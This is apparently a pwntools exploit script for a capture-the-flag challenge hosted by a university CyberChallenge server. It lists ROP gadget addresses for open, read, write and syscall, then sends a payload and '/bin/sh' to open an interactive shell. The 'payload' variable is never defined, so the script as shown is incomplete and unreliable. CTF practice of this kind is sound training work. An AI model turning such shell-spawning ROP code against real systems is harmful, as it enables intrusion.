from pwn import *

#p = process("./bin")
# p = gdb.debug(
#     "./bin",
#     """
#     break main
#     continue
#     """,
#     env={"LD_PRELOAD": "./libc.so.6"}
#     )
p = remote('cyberchallenge.disi.unitn.it', 9201)

pop_rbp = 0x000000000040111d #pop rbp; ret; 
pop_rdi = 0x0000000000401196 #pop rdi; ret; 
pop_rdx = 0x000000000040119a #pop rdx; ret; 
pop_rsi = 0x0000000000401198 #pop rsi; ret; 
rax_open_2 = 0x00000000004011b0
rax_read_0 = 0x000000000040119c
rax_write_1 =0x00000000004011a6
syscall = 0x00000000004011a3




p.sendline(payload)  
p.sendline(b'/bin/sh\x00')

p.interactive()
